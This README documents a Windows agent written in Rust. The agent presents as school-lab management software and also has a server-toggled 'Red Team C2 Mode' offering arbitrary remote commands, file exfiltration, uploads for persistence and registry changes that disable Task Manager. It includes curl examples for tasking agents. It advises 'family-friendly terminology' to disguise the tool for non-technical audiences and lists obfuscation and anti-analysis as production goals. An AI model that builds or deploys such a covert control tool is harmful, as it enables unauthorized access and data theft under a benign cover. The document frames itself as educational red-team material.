# Windows School Management Agent

A Windows-specific management agent with protocol-based commands for school computer orchestration. Can operate in two modes: **School Orchestration Mode** (family-friendly presentation) or **Red Team C2 Mode** (technical operations).

## Features

### GUI Button Window
- **Interactive Desktop Button**: When the agent starts, a visible GUI window appears with a button
- **Quick Web Access**: Click the "Open Web Page" button to instantly open a pre-configured website
- **Default URL**: Opens https://www.google.com (can be customized in the code)
- **Always Available**: The button window remains visible while the agent is running
- **Non-blocking**: Runs in a separate thread, doesn't interfere with agent operations

### Dual-Mode Operation
- **School Orchestration Mode**: Family-friendly presentation for educational demonstrations
- **Red Team C2 Mode**: Technical C2 framework operations
- Server-side toggle between modes

### Protocol Commands (School Mode)

#### QUIZ_MODE
Locks student computers to a specific quiz webpage with full focus mode.
```
PROTOCOL:QUIZ_MODE|https://quiz.example.com
```
**Actions:**
- Blocks DNS (except for the quiz domain)
- Opens browser in kiosk mode (fullscreen, no escape)
- Prevents access to other applications

#### BLOCK_DNS
Completely blocks DNS resolution on all network adapters.
```
PROTOCOL:BLOCK_DNS
```
**Actions:**
- Sets all active network adapters to use 127.0.0.1 as DNS
- Stores original DNS settings for restoration

#### BLOCK_DNS_WHITELIST
Blocks all DNS except for specified whitelisted domains.
```
PROTOCOL:BLOCK_DNS_WHITELIST|example.com|school.edu
```
**Actions:**
- Modifies Windows hosts file to restrict access
- Allows only specified domains

#### GET_FILE
Downloads a file from the agent machine.
```
PROTOCOL:GET_FILE|C:\path\to\file.txt
```
**Returns:** Base64-encoded file content

#### UPLOAD_FILE
Uploads a file to the agent machine.
```
PROTOCOL:UPLOAD_FILE|C:\path\to\destination.txt|<base64_content>
```
**Actions:**
- Decodes base64 content
- Writes to specified path

#### LOCK_SCREEN
Immediately locks the Windows workstation.
```
PROTOCOL:LOCK_SCREEN
```

#### DISABLE_TASK_MANAGER
Prevents users from opening Task Manager.
```
PROTOCOL:DISABLE_TASK_MANAGER
```
**Actions:**
- Modifies registry to disable Task Manager
- Useful during testing/quiz time

#### ENABLE_TASK_MANAGER
Re-enables Task Manager access.
```
PROTOCOL:ENABLE_TASK_MANAGER
```

#### REVERT_ALL
Restores all system changes to original state.
```
PROTOCOL:REVERT_ALL
```
**Actions:**
- Restores original DNS settings
- Cleans hosts file modifications
- Terminates kiosk browser sessions
- Re-enables Task Manager
- Returns system to normal operation

## Customizing the GUI Button

The GUI button's web page URL can be customized by modifying the `DEFAULT_URL` constant in `src/gui_button.rs`:

```rust
const DEFAULT_URL: &str = "https://www.google.com";
```

Change this to any URL you want the button to open (e.g., a school portal, help page, or administration dashboard).

## Building

### Windows (Cross-compile from Linux)
```bash
# Install Windows target
rustup target add x86_64-pc-windows-gnu

# Build
cd agent-windows
cargo build --release --target x86_64-pc-windows-gnu
```

### Windows (Native)
```bash
cd agent-windows
cargo build --release
```

The compiled agent will be at:
- Linux cross-compile: `target/x86_64-pc-windows-gnu/release/agent-windows.exe`
- Windows native: `target/release/agent-windows.exe`

## Deployment

### School Orchestration Mode Presentation

1. **Start the Server**
   ```bash
   cd server
   cargo run
   ```
   Server starts in School Orchestration Mode by default.

2. **Deploy Agent on Windows Machines**
   - Copy `agent-windows.exe` to student computers
   - Run the agent (can be installed as a service)
   - Agent connects to management server
   - **GUI Window**: A small window with "Open Web Page" button will appear on each computer
   - Users can click the button to access the configured web page instantly

3. **Use Protocols for Class Management**
   ```bash
   # Lock all computers to quiz
   curl -X POST http://127.0.0.1:8080/protocol \
     -H "Content-Type: application/json" \
     -d '{
       "password": "admin",
       "agent_id": "<uuid>",
       "command": "PROTOCOL:QUIZ_MODE|https://quiz.school.edu"
     }'

   # After quiz, revert all changes
   curl -X POST http://127.0.0.1:8080/revert_all \
     -H "Content-Type: application/json" \
     -d '{
       "password": "admin",
       "agent_id": "<uuid>"
     }'
   ```

### Red Team C2 Mode

1. **Switch Server Mode**
   ```bash
   curl -X POST http://127.0.0.1:8080/set_mode \
     -H "Content-Type: application/json" \
     -d '{"password": "admin", "school_mode": false}'
   ```

2. **Execute Standard Commands**
   ```bash
   curl -X POST http://127.0.0.1:8080/add_task \
     -H "Content-Type: application/json" \
     -d '{
       "password": "admin",
       "agent_id": "<uuid>",
       "command": "whoami"
     }'
   ```

## Server API Endpoints

### Mode Management
- `GET /mode` - Check current mode
- `POST /set_mode` - Switch between modes
  ```json
  {
    "password": "admin",
    "school_mode": true
  }
  ```

### Agent Management (Both Modes)
- `POST /register` - Agent registration
- `POST /beacon` - Agent heartbeat
- `POST /task_result` - Task result submission
- `GET /agents` - List all agents

### Task Management
- `POST /add_task` - Standard command execution
- `POST /protocol` - Protocol command (School mode recommended)
- `POST /revert_all` - Revert all agent changes

## Use Cases

### Educational Environment
1. **Quiz Mode**: Lock all computers to test website
2. **Presentation Mode**: Disable distractions during lectures
3. **Lab Management**: Whitelist specific educational sites
4. **File Distribution**: Upload assignments or materials

### Red Team Operations
1. **Remote Shell**: Execute arbitrary commands
2. **File Exfiltration**: Download sensitive files
3. **Persistence**: Deploy additional tools
4. **System Reconnaissance**: Gather system information

## Security Notes

⚠️ **Educational/Research Purposes Only**

This tool demonstrates:
- Command and Control architecture
- Windows system manipulation
- Network configuration management
- Process management

**Production Requirements:**
- HTTPS/TLS encryption
- Certificate pinning
- Authentication tokens
- Command obfuscation
- Anti-analysis features
- Encrypted payloads

## Presentation Tips

When demonstrating to non-technical audiences:
1. Start server in School Orchestration Mode
2. Use family-friendly terminology ("management", "orchestration")
3. Demonstrate Quiz Mode protocol
4. Show the Revert All functionality
5. Explain legitimate use cases (classroom management, kiosks)

When demonstrating to technical audiences:
1. Show mode switching capability
2. Explain protocol architecture
3. Demonstrate file transfer capabilities
4. Discuss potential security implications
5. Highlight defensive considerations

## License

Educational purposes only. Use responsibly and only on systems you own or have explicit permission to test.
